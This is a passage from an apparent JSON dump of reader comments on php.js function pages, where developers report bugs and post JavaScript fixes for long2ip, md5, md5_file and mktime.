int"},{"date":"2009-09-04 19:00:26","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ John: That will happen if you try to move around IPs in long notation between systems anyway, cause the max integer size isn't fixed:\n\nOn 64 bits system ip2long ONLY RETURNS POSITIVE VALUES\n\nso\n\n<?php\necho ip2long('200.200.200.200');\n?>\n\nwill output -926365496 on a 32 bits system and 3368601800  on a 64 bits system\n\nSo basically only use this in the confinement of 1 process, or use a methods to get consistent numbers like sprintf('%u') before transporting to database\/client\/whatever"},{"date":"2011-11-15 10:56:04","author":"Oscar Broman","url":"","comment":"Correction\/improvement:\n[code]\nfunction long2ip(ip) {\n\treturn [ip >>> 24, ip >>> 16 & 0xFF, ip >>> 8 & 0xFF, ip & 0xFF].join('.');\n}\n[\/code]"},{"date":"2012-07-05 11:21:34","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Oscar Broman: Can you integrate at least as comprehensive argument checking as we have in our existing version, following PHP behavior without losing the performance benefits of your new version?"},{"date":"2012-07-24 22:15:08","author":"Oscar Broman","url":"https:\/\/github.com\/oscar-broman\/","comment":"@Brett Zamir: I'm not entirely sure whether that was rhetorical. Anyway, here you go:\n[code]\nfunction long2ip(ip) {\n\tif (!isFinite(ip))\n\t\treturn false;\n\t\n\treturn [ip >>> 24, ip >>> 16 & 0xFF, ip >>> 8 & 0xFF, ip & 0xFF].join('.');\n}\n[\/code]\n\nThe boundary checking being done in the original function isn't what the PHP function does - it simply converts the input to a long. Therefore, negative values (which some systems dealing with IPs as signed integers will give you) will be treated correctly.\nWhere is this done in JS, one might ask? Bitwise operators in JS treat their operands as 32 bit integers, so the given number will essentially be implicitly casted to one."}],"max":[{"date":"2008-09-11 20:35:55","author":"Onno Marsman","url":"","comment":"Kevin: I've sent a greatly improved version through email."},{"date":"2012-05-06 09:31:46","author":"????? ????? ???","url":"http:\/\/an3m1.com\/","comment":"I agree it is a very informative article and I actually enjoy reading good stuff unlike all the crap out there on the internet \n"}],"md5":[{"date":"2008-01-18 05:53:21","author":"Ates Goral","url":"","comment":"A while back, I had published a function called phpSerialize() (that does what the PHP serialize() function does) at http:\/\/magnetiq.com\/2006\/07\/30\/php-style-serialization-of-javascript-objects\/\r\n\r\nHere's the code copied here:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\/* Returns the class name of the argument or undefined if\r\n   it's not a valid JavaScript object.\r\n*\/\r\nfunction getObjectClass(obj)\r\n{\r\n    if (obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor.toString)\r\n    {\r\n        var arr = obj.constructor.toString().match(\r\n            \/function\\s*(\\w+)\/);\r\n\r\n        if (arr &amp;&amp; arr.length == 2)\r\n        {\r\n            return arr[1];\r\n        }\r\n    }\r\n\r\n    return undefined;\r\n}\r\n\r\n\/* Serializes the given argument, PHP-style.\r\n\r\n   The type mapping is as follows:\r\n\r\n   JavaScript Type    PHP Type\r\n   ---------------    --------\r\n   Number             Integer or Decimal\r\n   String             String\r\n   Boolean            Boolean\r\n   Array              Array\r\n   Object             Object\r\n   undefined          Null\r\n\r\n   The special JavaScript object null also becomes PHP Null.\r\n   This function may not handle associative arrays or array\r\n   objects with additional properties well.\r\n*\/\r\nfunction phpSerialize(val)\r\n{\r\n    switch (typeof(val))\r\n    {\r\n    case &quot;number&quot;:\r\n        return (Math.floor(val) == val ? &quot;i&quot; : &quot;d&quot;) + &quot;:&quot; +\r\n            val + &quot;;&quot;;\r\n    case &quot;string&quot;:\r\n        return &quot;s:&quot; + val.length + &quot;:\\&quot;&quot; + val + &quot;\\&quot;;&quot;;\r\n    case &quot;boolean&quot;:\r\n        return &quot;b:&quot; + (val ? &quot;1&quot; : &quot;0&quot;) + &quot;;&quot;;\r\n    case &quot;object&quot;:\r\n        if (val == null)\r\n        {\r\n            return &quot;N;&quot;;\r\n        }\r\n        else if (&quot;length&quot; in val)\r\n        {\r\n            var idxobj = { idx: -1 };\r\n\r\n            return &quot;a:&quot; + val.length + &quot;:{&quot; + val.map(\r\n                function (item)\r\n                {\r\n                    this.idx++;\r\n\r\n                    var ser = phpSerialize(item);\r\n\r\n                    return ser ?\r\n                        phpSerialize(this.idx) + ser :\r\n                        false;\r\n                }, idxobj).filter(\r\n                function (item)\r\n                {\r\n                    return item;\r\n                }).join(&quot;&quot;) + &quot;}&quot;;\r\n        }\r\n        else\r\n        {\r\n            var class_name = getObjectClass(val);\r\n\r\n            if (class_name == undefined)\r\n            {\r\n                return false;\r\n            }\r\n\r\n            var props = new Array();\r\n\r\n            for (var prop in val)\r\n            {\r\n                var ser = phpSerialize(val[prop]);\r\n\r\n                if (ser)\r\n                {\r\n                    props.push(phpSerialize(prop) + ser);\r\n                }\r\n            }\r\n            return &quot;O:&quot; + class_name.length + &quot;:\\&quot;&quot; +\r\n                class_name + &quot;\\&quot;:&quot; + props.length + &quot;:{&quot; +\r\n                props.join(&quot;&quot;) + &quot;}&quot;;\r\n        }\r\n    case &quot;undefined&quot;:\r\n        return &quot;N;&quot;;\r\n    }\r\n\r\n    return false;\r\n}\r\n[\/CODE]"},{"date":"2008-01-18 11:13:03","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ates Goral: I've added it to my queue. You can check out RSS to see when it gets added here. Thank you for that masterpiece!"},{"date":"2008-01-28 02:34:39","author":"Eric","url":"","comment":"I think it'd be fantastic to see these functions coupled with some performance measurements, both so we can see areas need optimization and to help people understand which operations are unrealistically expensive."},{"date":"2008-01-29 21:00:09","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Eric: Interesting thought. \r\nBut that would mean maintaining multiple versions of the same function, just to be able to do a 'solid' benchmark (by eliminating as many variables such as platform, browser, processor, etc. between your workstation and mine). \r\n\r\nAnd storing and maintaining different versions for the sole purpose of a micro benchmark would slow the project down in this phase, I think.\r\n\r\nSo for now, I think I'll leave it up to the community to suggest speed improvements instead.\r\n\r\nBut thanks for your input, very much appreciated!"},{"date":"2008-01-30 08:04:45","author":"Philip Andrew","url":"","comment":"This is a good idea if you want to combine it with Aptana JAXER then it makes JAXER more like PHP.\r\nhttp:\/\/www.aptana.com\/jaxer\/"},{"date":"2008-02-06 20:32:17","author":"Evil Angelica","url":"","comment":"[CODE=&quot;Javascript&quot;]alert:(You Have Been H4x0r3D! By Evil Angelica"},{"date":"2008-02-07 00:12:29","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Evil Angelica: Guess I haven't.. Do you have any idea what hacking is?"},{"date":"2008-11-15 17:14:49","author":"Wetter","url":"http:\/\/www.in-wetter.at","comment":"It is very useful article - exactly this I find long time. Thank you."},{"date":"2009-06-07 19:26:20","author":"Rob","url":"","comment":"Should the dependency be used even if the page encoding is already set to utf-8 through the Content-Type meta tag?"},{"date":"2009-06-10 20:28:26","author":"pilus","url":"NONE","comment":"Sorry if I sound kinda lame coz I am, but what about the second argument to php's md5()  that returns raw binary data ? how could I do that in JS ? Anyone know ?"},{"date":"2010-11-25 07:24:19","author":"ion","url":"","comment":"you can take a look at this site: http:\/\/md5hashdecrypter.com\/decrypt.php"},{"date":"2010-12-20 23:57:48","author":"Rob","url":"","comment":"There's a minor bug in convertToWordArray() that causes the word array input to the MD5 function to have null values. JavaScript does the right thing anyway, but it may not be desired behavior. Here's one fix:\n\n[CODE]\nvar convertToWordArray = function (str) {\n\tvar lWordCount;\n\tvar lMessageLength = str.length;\n\tvar lNumberOfWords_temp1=lMessageLength + 8;\n\tvar lNumberOfWords_temp2=(lNumberOfWords_temp1-(lNumberOfWords_temp1 % 64))\/64;\n\tvar lNumberOfWords = (lNumberOfWords_temp2+1)*16;\n\tvar lWordArray=new Array(lNumberOfWords-1);\n\t\/* Initialize lWordArray *\/\n\tvar i = lWordArray.length; while ( i-- ) { lWordArray[i] = 0; }\n\tvar lBytePosition = 0;\n\tvar lByteCount = 0;\n\twhile ( lByteCount < lMessageLength ) {\n\t\tlWordCount = (lByteCount-(lByteCount % 4))\/4;\n\t\tlBytePosition = (lByteCount % 4)*8;\n\t\tlWordArray[lWordCount] = (lWordArray[lWordCount] | (str.charCodeAt(lByteCount)<<lBytePosition));\n\t\tlByteCount++;\n\t}\n\tlWordCount = (lByteCount-(lByteCount % 4))\/4;\n\tlBytePosition = (lByteCount % 4)*8;\n\tlWordArray[lWordCount] = lWordArray[lWordCount] | (0x80<<lBytePosition);\n\tlWordArray[lNumberOfWords-2] = lMessageLength<<3;\n\tlWordArray[lNumberOfWords-1] = lMessageLength>>>29;\n\treturn lWordArray;\n};\n[\/CODE]\n\nAlso, addUnsigned can be shortened up a lot if you're willing to bet on JavaScript not changing its behavior. Since JavaScript currently has 53 bits of precision for its number type, you can change addUnsigned to:\n\n[CODE]\nvar addUnsigned = function (lX,lY) {\n\tvar x = lX + lY;\n\treturn x < 0xFFFFFFFF ? x : x - 0x100000000;\n};\n[\/CODE]\n\nSince addUnsigned is an innermost function, that might or might not be a desirable change. I've tested it with known MD5 values on several browsers and they've all handled it correctly."},{"date":"2010-12-22 05:58:09","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Rob: Hi Rob, thanks for your input. Someone claimed that unlike ours, http:\/\/pajhome.org.uk\/crypt\/md5\/ (under a BSD license) works correctly with non-ASCII characters. Do you have the inclination to test that for us? I'd hate to make patches if we should be working on another code base instead. "},{"date":"2011-06-22 14:02:51","author":"Steve","url":"","comment":"This js will not work with long string and will not handle string containing \"&\" symbols. "},{"date":"2012-04-18 10:19:40","author":"???? ????","url":"http:\/\/an3m1.com\/","comment":"Write more, that\u2019s all I have to say. Literally, it seems as though you relied on the video to make your point. You clearly know what you\u2019re talking about, why waste your intelligence on just posting videos to your blog when you could be giving us something enlightening to read  \n"},{"date":"2012-05-19 20:09:47","author":"AngelFcM","url":"localhost","comment":"I tried use it in the console web of Firefox but returns me the next error.\n \n[13:07:48.759] TypeError: this.utf8_encode is not a function\n\n???"},{"date":"2012-06-16 04:42:20","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@AngelFcM: there is a dependency listed; you have to add the utf8_encode() function---but I should warn you that this function does not seem to behave properly, at least like in PHP, or at least for non-ASCII. http:\/\/pajhome.org.uk\/crypt\/md5\/  claims to do this, so I'd like to see if we could test to confirm. "}],"md5_file":[{"date":"2008-02-18 04:30:03","author":"cagri ekin","url":"","comment":"you may want to check this link for parse_str,\r\n\r\nhttp:\/\/www.phpbuilder.com\/board\/showthread.php?t=10349280"},{"date":"2008-02-18 10:44:05","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ cagri ekin: I will look into it &amp; credit you accordingly if I decide to use the code. Thank you cagri!"},{"date":"2008-04-10 10:42:07","author":"php five","url":"","comment":"your php.js script is Amazing"},{"date":"2009-12-15 13:51:05","author":"Robert Zebedee","url":"","comment":"I have run your scripts and I have found a flaw the md5 that the scripts produce is of the file name not the file itself. The md5_file function in perl is the md5 of the file not the file name."},{"date":"2009-12-15 15:07:45","author":"Robert Zebedee","url":"","comment":"To update my last comment it is not creating the md5 of the file name but it is not creting an md5 which matches the md5sum in bash or md5_file in perl."},{"date":"2009-12-15 17:37:44","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Robert: Could you check whether the following works? Make sure you have the latest version of file_get_contents() too. It might only work in Firefox (and not IE) though, since it relies on overrideMimeType()...\n\nI think we need to get the file in binary form as PHP does (we currently don't by default because it is usually not as useful). But maybe we should though to reflect the PHP API...\n\nAnyways, let us know if this approach works at least in FF... I think my regular expression is correct and necessary there to shift back everything from the private characters into the normal ASCII range...(the trick used inside file_get_contents() is documented at https:\/\/developer.mozilla.org\/En\/Using_XMLHttpRequest#Receiving_binary_data )\n\n[CODE]function md5_file ( str_filename ) {\n    var buf = ''; \n    buf = this.file_get_contents(str_filename, 'FILE_BINARY');\n    buf = buf.replace(\/[\\s\\S]\/g, function (n) {n.charCodeAt(0) & 0xFF;});\n    return buf ? this.md5(buf) : false;\n}[\/CODE]"},{"date":"2009-12-15 17:53:06","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Argh, sorry, two mistakes in that one...Try this:\n\n[CODE]function md5_file ( str_filename ) {\n    var buf = ''; \n    buf = this.file_get_contents(str_filename, 'FILE_BINARY');\n    return buf ? this.md5(buf).replace(\/[\\s\\S]\/g, function (n) {return n.charCodeAt(0) & 0xFF;}) : false;\n}\n[\/CODE]"},{"date":"2009-12-15 18:01:36","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Nope, not that either... This should be it sorry...\n\n[CODE]function md5_file ( str_filename ) {\n    var buf = ''; \n    buf = this.file_get_contents(str_filename, 'FILE_BINARY');\n    buf = buf.replace(\/[\\s\\S]\/g, function (n) {return String.fromCharCode(n.charCodeAt(0) & 0xFF);});\n    return buf ? this.md5(buf) : false;\n}[\/CODE]"},{"date":"2009-12-16 05:57:55","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"In doing testing, we should also confirm whether md5() itself is giving correct results for the file represented as a string in PHP and our version..."},{"date":"2009-12-18 12:29:19","author":"Robert","url":"","comment":"I will try you last suggestion and let you know."},{"date":"2009-12-18 13:40:34","author":"Robert","url":"","comment":"No joy on that still returns a different value."},{"date":"2009-12-18 15:07:32","author":"Robert","url":"","comment":"It is also returning a different value every time it runs."},{"date":"2010-01-06 07:57:37","author":"smileart","url":"smileart.mp","comment":"Sorry, but it's return different result than PHP md5() function. Is there any way to fix it?"},{"date":"2010-01-07 06:49:49","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@smileart (and @Robert too, for that matter): Sorry, but I'm not sure the technique used in file_get_contents() to get binary data works perfectly (and probably not in IE anyways--see the notes below), or perhaps the way we're using it. If someone has time, it would be useful to know whether the issue lies in our md5() implementation or in the file_get_contents(). If the problem is the latter, it would be nice to have a very short file (as short as possible) that demonstrates the issue. If the problem is the former, we should be discussing this on the md5() page."},{"date":"2010-06-26 17:51:13","author":"Buterrip","url":"","comment":"Hi, hi get this function working on ff, with a diferent code from md5 of php, and md5summer, and it don't work of all in google chrome, with bad or good md5, just get undefined :S can someone help? "},{"date":"2010-06-26 17:59:20","author":"Buterrip","url":"","comment":"Hi again :S i got the correct md5 if it is a text file, but not with a image... What about working on chrome? it doesn't\nTy."},{"date":"2010-06-27 08:12:34","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Buterrip: This was reported earlier, but not having written the function nor familiar with the algorithm, I'm not sure how to fix it. I was going to see how well the Dojo version worked as Dojo usually provides robust implementations: http:\/\/api.dojotoolkit.org\/jsdoc\/HEAD\/dojox.encoding.digests.MD5 but haven't gotten to it. The only problem (assuming it works) is that if you want a stand-alone function, you will have to figure out how to extract it, since Dojo is part of a larger library. If you do make a stand-alone version and it is consistent with (correct) PHP, etc. behavior, we'd love to have an updated version."},{"date":"2010-06-28 05:34:17","author":"Buterrip","url":"","comment":"Brett Zamir, thanks for all, i'm developing a addon for chrome, i will really need to have it in the code script or send the files to a server wich makes the md5, i have to see, if i can and i do understand chrome well i will try to do it. But thinking, in firefox we don't need this library, firefox have a service called \"hash\", and another one called \"binarycontent\" i think, to make a md5 over firefox, that's all what you need... Thanks."},{"date":"2010-06-28 05:43:47","author":"Buterrip","url":"","comment":"But i still thinking the error is only on file_get_contents, because the md5 function works fine, but when don't return the binary or content data, the md5_file will not work, thinking logically.\nThank"},{"date":"2010-06-28 12:11:41","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"It is possible that the file_get_contents() method of obtaining binary data is flawed. See https:\/\/developer.mozilla.org\/en\/using_xmlhttprequest#Receiving_binary_data for that method and the relevant portion in file_get_contents() that refers to this. \n\nHowever, given that I believe I've tested this before and others have reported issues, I wonder whether the real issue here for you may be that you are working only with regular ASCII data in your text and thus unable to see problems with md5(). As I recall it wasn't something unusual like 4-byte characters but regular 2-byte characters in non-ASCII (or maybe unusual portions of ASCII). Sorry that I don't have time to investigate this fully myself."},{"date":"2012-04-04 14:25:04","author":"??????? ????? ???","url":"http:\/\/an3m1.com\/","comment":"They have done such a great job with this. This is why they are deserving of these awards. Keep up the good work.    \n"}],"min":[{"date":"2008-09-11 20:35:08","author":"Onno Marsman","url":"","comment":"Kevin: I've sent a greatly improved version through email."}],"mktime":[{"date":"2008-02-03 20:33:28","author":"_argos","url":"","comment":"Hi Kevin, I'm attaching 3 functions more for the PHP.js project.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction array_product ( input ) {\r\n\tvar Index = 0, Product = 1;\r\n\t\r\n\tif ( input instanceof Array ) {\r\n\t\twhile ( Index &lt; input.length  ) {\r\n\t\t\tProduct *= ( !isNaN ( input [ Index ] ) ? input [ Index ] : 0 );\r\n\t\t\tIndex++;\r\n\t\t}\r\n\t} else {\r\n\t\tproduct = null;\r\n\t}\r\n\t\t\t\r\n\treturn product;\r\n}\r\n\r\nfunction array_rand ( input, num_req ) {\r\n\tvar Indexes = [];\r\n\tvar Ticks = num_req || 1;\r\n\tvar Check = {\r\n\t\tDuplicate\t: function ( input, value ) {\r\n\t\t\tvar Exist = false, Index = 0;\r\n\t\t\twhile ( Index &lt; input.length ) {\r\n\t\t\t\tif ( input [ Index ] === value ) {\r\n\t\t\t\t\tExist = true;\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tIndex++;\r\n\t\t\t}\t\t\t\r\n\t\t\treturn Exist;\r\n\t\t}\r\n\t};\r\n\t\r\n\tif ( input instanceof Array &amp;&amp; Ticks &lt;= input.length ) {\r\n\t\twhile ( true ) {\r\n\t\t\tvar Rand = Math.floor ( ( Math.random ( ) * input.length ) );\r\n\t\t\tif ( Indexes.length === Ticks ) { break; }\r\n\t\t\tif ( !Check.Duplicate ( Indexes, Rand ) ) { Indexes.push ( Rand ); }\r\n\t\t}\r\n\t} else {\r\n\t\tIndexes = null;\r\n\t}\r\n\t\r\n\treturn ( ( Ticks == 1 ) ? Indexes.join ( ) : Indexes );\r\n}\r\n\r\nfunction compact ( var_names ) {\r\n\tvar Index = 0, Matrix = {};\r\n\tvar Process = function ( value ) {\r\n\t\tfor ( var i = 0; i &lt; value.length; i++ ) {\r\n\t\t\tvar key_value = value [ i ];\t\t\t\r\n\t\t\tif ( key_value instanceof Array ) {\r\n\t\t\t\tProcess ( key_value );\r\n\t\t\t} else {\r\n\t\t\t\tif ( typeof window [ key_value ] !== 'undefined' ) {\r\n\t\t\t\t\tMatrix [ key_value ] = window [ key_value ];\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn true;\r\n\t};\r\n\t\r\n\tProcess ( arguments );\r\n\r\n\treturn Matrix;\r\n}\r\n[\/CODE]"},{"date":"2008-02-03 20:39:00","author":"_argos","url":"","comment":"Kevin, a litle fix in array_product\r\n\r\nfunction array_product ( input ) {\r\n  var Index = 0, Product = 1;\r\n  \r\n  if ( input instanceof Array ) {\r\n    while ( Index &lt; input.length  ) {\r\n      Product *= ( !isNaN ( input [ Index ] ) ? input [ Index ] : 0 );\r\n      Index++;\r\n    }\r\n  } else {\r\n    Product = null;\r\n  }\r\n      \r\n  return Product;\r\n}"},{"date":"2008-02-03 23:17:14","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ _argos: One thing: array_rand produces javascript errors when you feed it an object instead of an array. maybe we should implement some sort of sanity checking there.\r\n\r\nOther than that: Nice work again man, you've earned yourself 2 gold medals :)"},{"date":"2008-02-21 01:03:14","author":"baris ozdil","url":"","comment":"Hi Kevin,\r\nThanks a lot for this nice library.\r\nJust a small correction in mktime. In javascript the setMonth the month values are 0 based indexed. I think it should be something like this:\r\n[CODE=&quot;javascript&quot;]\r\n    var dateManip = {\r\n        0: function(tt){ return d.setHours(tt); },\r\n        1: function(tt){ return d.setMinutes(tt); },\r\n        2: function(tt){ return d.setSeconds(tt); },\r\n        3: function(tt){ return d.setMonth(parseInt(tt)-1); },\r\n        4: function(tt){ return d.setDate(tt); },\r\n        5: function(tt){ return d.setYear(tt); }\r\n    };\r\n[\/CODE]"},{"date":"2008-02-21 12:18:07","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ baris ozdil: Thank your for your contribution, I've updated php.js and included you in the credits!"},{"date":"2008-03-02 05:26:34","author":"Michael White","url":"","comment":"The example appears to be incorrect for this function. I checked in a PHP script to verify this and to get the correct value.\r\n\r\nThe new example:\r\n[CODE=&quot;Javascript&quot;]\r\n\t\t\/\/ *     example 1: mktime( 14, 10, 2, 2, 1, 2008 );\r\n\t\t\/\/ *     returns 1: 1201893002\r\n[\/CODE]"},{"date":"2008-03-02 11:55:09","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael White: Tried to reproduce the behavior, but wasn't able to:\r\nhttp:\/\/kevin.vanzonneveld.net\/test.php"},{"date":"2008-03-22 17:09:38","author":"gabriel paderni","url":"","comment":"If i'm not mistaken there's a bug when using strings as parameters:\r\n\r\nhere is the test I've made:\r\n[CODE=&quot;Javascript&quot;]\r\n&lt;script type=&quot;text\/javascript&quot;&gt;\r\nfunction mktimetest(t_php,t_js){\r\n\tdocument.write(t_php+'&lt;br \/&gt;'+t_js);\r\n\tif(t_php!=t_js)document.write(' &amp;lt;- Error');\r\n\tdocument.write('&lt;br \/&gt;&lt;br \/&gt;');\r\n}\r\nmktimetest(&lt;?php echo mktime('01','30','10','06','21','2008')?&gt;,mktime('01','30','10','06','21','2008'));\r\nmktimetest(&lt;?php echo mktime('01','30','10','07','21','2008')?&gt;,mktime('01','30','10','07','21','2008'));\r\nmktimetest(&lt;?php echo mktime('01','30','10','08','21','2008')?&gt;,mktime('01','30','10','08','21','2008'));\r\nmktimetest(&lt;?php echo mktime('01','30','10','09','21','2008')?&gt;,mktime('01','30','10','09','21','2008'));\r\nmktimetest(&lt;?php echo mktime('01','30','10','10','21','2008')?&gt;,mktime('01','30','10','10','21','2008'));\r\nmktimetest(&lt;?php echo mktime('01','30','10','11','21','2008')?&gt;,mktime('01','30','10','11','21','2008'));\r\n&lt;\/script&gt;\r\n[\/CODE]\r\n\r\nStrangely in the test this shows up only for August and September.\r\n\r\nThe solution may be to remove the leading zero when the parameter is a string.\r\n\r\n(Tested with: Firefox and Internet explorer, same result.)"},{"date":"2008-03-23 11:14:27","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ gabriel paderni: The example won't reproduce:  \r\nhttp:\/\/kevin.vanzonneveld.net\/test.php\r\n\r\nBut I've added the parseInt function. Does that solve the bug? Thanks gabriel!"},{"date":"2008-03-31 21:13:27","author":"FGFEmperor","url":"","comment":"I have no idea why, but this:\r\nalert('PHP: &lt;?= mktime(0,0,0,4,5,2009); ?&gt;\\nJS: '+mktime(0,0,0,4,5,2009));\r\nreturns this:\r\nPHP: 1238900400\r\nJS:  1241550694\r\nAny idea why? That way, I should get 4\/5\/2009 for both, but I'm getting 5\/5\/2009 on the JS version..."},{"date":"2008-03-31 22:10:37","author":"FGFEmperor","url":"","comment":"Got It!\r\nAdd\r\n[CODE=&quot;Javascript&quot;]d.setHours(0,0,0); d.setDate(1); d.setMonth(1); d.setYear(1970);[\/CODE]\r\nafter\r\n[CODE=&quot;Javascript&quot;]var no, i = 0, d = new Date(), argv = arguments, argc = argv.length;[\/CODE]\r\n\r\nThe catch here is that d = New Date(); sets d to the current date. What was happening is that today is the 31th, and I the function was setting the month to February, but the day was still the 31th, then it would set the month to March (since February has only 28\/29 days). ;-)"},{"date":"2008-03-31 22:28:56","author":"FGFEmperor","url":"","comment":"OK, another update:\r\nchange\r\nd.setYear(1970);\r\nto\r\nd.setYear(1972);\r\nWhy? Because this way Leap Years are gonna work."},{"date":"2008-04-02 13:28:11","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ FGFEmperor: Good work man, thanks a lot, I'll update the function!"},{"date":"2008-04-18 21:03:59","author":"FGFEmperor","url":"","comment":"OK, now setting a month to something greater than 11 would not increase the year...\r\nMy correction (also for hours, minutes and seconds...\r\n[CODE=&quot;Javascript&quot;]\r\n    var no, ma = 0, mb = 0, i = 0, d = new Date(), argv = arguments, argc = argv.length;\r\n    d.setHours(0,0,0); d.setDate(1); d.setMonth(1); d.setYear(1972);\r\n \r\n    var dateManip = {\r\n        0: function(tt){ return d.setHours(tt); },\r\n        1: function(tt){ return d.setMinutes(tt); },\r\n        2: function(tt){ set = d.setSeconds(tt); mb = d.getDate() - 1; return set; },\r\n        3: function(tt){ set = d.setMonth(parseInt(tt)-1); ma = d.getFullYear() - 1972; return set; },\r\n        4: function(tt){ return d.setDate(tt+mb); },\r\n        5: function(tt){ return d.setYear(tt+ma); }\r\n    };\r\n[\/CODE]\r\n\r\nBasically I added 'ma' and 'mb' to the vars, and summed that on Years and Days... =)"},{"date":"2008-04-19 14:50:26","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ FGFEmperor: Thanks a lot!"},{"date":"2008-04-20 03:34:18","author":"Philip Peterson","url":"","comment":"Just so you know... this is six hours off in firefox, I think? :-\/  In the php_tester example, at least... I'm not sure what's doing it, though..."},{"date":"2008-04-20 07:30:04","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Philip Peterson: Yeah that's related to the different timezones that we are in."},{"date":"2008-04-21 21:01:29","author":"Philip Peterson","url":"","comment":"Hmm, yeah, I figured that might be it, but does PHP do that?  If not it might be a good idea to set the timezone to UTC\/GMT\/Something as a standard, or maybe including a config file to choose whether to leave it up to the user's computer or to set a standard?"},{"date":"2008-04-22 09:39:47","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Philip Peterson: Hi Philip. Running the tests in a predefined timezone seems to be a good solution. We should opt for UTC I think. Then adjust the 'result' comment to match the UTC outcome of mktime. Much better indeed!"},{"date":"2008-04-22 09:43:26","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Philip Peterson: If it's even possible to set the timezone for an entire page... I think you can only do this to a date object.\r\n\r\nSo maybe the right approach is to include a\r\n[CODE=&quot;Javascript&quot;]\r\n+(date.getTimeZoneOffset() * 60 * 60);\r\n[\/CODE]\r\nIn the test to neutralize the end user's timezone?"},{"date":"2008-05-21 12:34:18","author":"Yannoo","url":"","comment":"There are a probleme with :\r\n[CODE=&quot;Javascript&quot;]\r\nmktime(0, 0, 0, 5, 8, 2008);\r\nmktime(0, 0, 0, 5, 9, 2008);\r\n[\/CODE]\r\nThe timestamp is wrong !"},{"date":"2008-05-21 12:54:38","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Yannoo: What output are you getting? What should it be? Could this be related to the different timezones?"},{"date":"2008-05-21 13:47:08","author":"@Kevin","url":"","comment":"I've test different date. Look results :\r\n[CODE=&quot;Javascript&quot;]\r\nalert(mktime(0, 0, 0, 5, 03, 2008)); \/\/ 1209765600\r\nalert(mktime(0, 0, 0, 5, 04, 2008)); \/\/ 1209852000\r\nalert(mktime(0, 0, 0, 5, 05, 2008)); \/\/ 1209938400\r\nalert(mktime(0, 0, 0, 5, 06, 2008)); \/\/ 1210024800\r\nalert(mktime(0, 0, 0, 5, 07, 2008)); \/\/ 1210111200\r\nalert(mktime(0, 0, 0, 5, 08, 2008)); \/\/ 1209592800\r\nalert(mktime(0, 0, 0, 5, 09, 2008)); \/\/ 1209592800\r\nalert(mktime(0, 0, 0, 5, 10, 2008)); \/\/ 1210370400\r\nalert(mktime(0, 0, 0, 5, 11, 2008)); \/\/ 1210465800\r\n[\/CODE]"},{"date":"2008-05-21 13:59:43","author":"Yannoo","url":"","comment":"@Kevin\r\nI've test different date. Look results :\r\n[CODE=&quot;Javascript&quot;]\r\nalert(mktime(0, 0, 0, '05', '03', '2008')); \/\/ 1209765600\r\nalert(mktime(0, 0, 0, '05', '04', '2008')); \/\/ 1209852000\r\nalert(mktime(0, 0, 0, '05', '05', '2008')); \/\/ 1209938400\r\nalert(mktime(0, 0, 0, '05', '06', '2008')); \/\/ 1210024800\r\nalert(mktime(0, 0, 0, '05', '07', '2008')); \/\/ 1210111200\r\nalert(mktime(0, 0, 0, '05', '08', '2008')); \/\/ 1209592800 (it should be 1210197600)\r\nalert(mktime(0, 0, 0, '05', '09', '2008')); \/\/ 1209592800 (it should be 1210284000)\r\nalert(mktime(0, 0, 0, '05', '10', '2008')); \/\/ 1210370400\r\nalert(mktime(0, 0, 0, '05', '11', '2008')); \/\/ 1210465800\r\n[\/CODE]\r\n\r\nMy timezone is Paris (GMT+1)"},{"date":"2008-05-21 14:31:26","author":"Yann","url":"","comment":"Well, this is my script :\r\n[CODE=&quot;Javascript&quot;]\r\nfunction dateFr2timestamp(dateFr) {\r\n  var a_date = explode('\/', dateFr); \/\/ array with {0:day; 1:month; 2:year)\r\n  return mktime(0,0,0,a_date[1],a_date[0],a_date[2]);\r\n}\r\n[\/CODE]\r\ndateFr is any date to french format (dd\/mm\/yyyy) --&gt; '08\/05\/2008', '01\/01\/2008', '31\/12\/2008', ...\r\n\r\nWith dates '08\/05\/2008' and '09\/05\/2008', there are problems : wrong timestamp"},{"date":"2008-05-21 18:45:06","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Yanno: I have found the bug. It lays in using '09'. When using a number 9, the function worked normally. So I investigated further and it turns out that\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nparseInt('09') \/\/ returns 0 instead of 9\r\n[\/CODE]\r\nMultiplying by 1 seems to work:\r\n[CODE=&quot;Javascript&quot;]\r\nparseInt('09'*1) \/\/ returns 